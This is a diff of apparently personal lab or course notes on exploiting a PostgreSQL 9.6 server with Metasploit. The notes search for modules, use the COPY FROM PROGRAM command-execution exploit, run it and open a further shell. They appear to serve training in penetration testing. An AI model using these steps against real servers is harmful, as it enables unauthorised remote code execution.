@@ -15,11 +15,11 @@ Based off the server data in (ATK) (TERM 2) we saw that PostgreSQL is 9.6.0
 
 (ATK)(msf6) search postgreql 9.6
 
-(ATK)(msf6) search postgreql 9.
+(ATK)(msf6) search postgreql 9. [I USED 0 ON THIS]
 
 (ATK)(msf6) search postgreql 9
 
-(ATK)(msf6)> use 0 because its a expliot module [for me i had to use line 4]
+(ATK)(msf6)> use 0 because its a expliot module 
 
 use exploit modules as much as possible.
 
@@ -43,7 +43,9 @@ LHOST comming back through our WAN
 
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options [check config]
 
-(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > run [should get exploit here] [2:10]
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > run [should get exploit here] [3:30][DAY 11]
+
+run id
 
 break out metasploit by using your first port you made creating another shell to brake out metasploit (he used 12222)
 
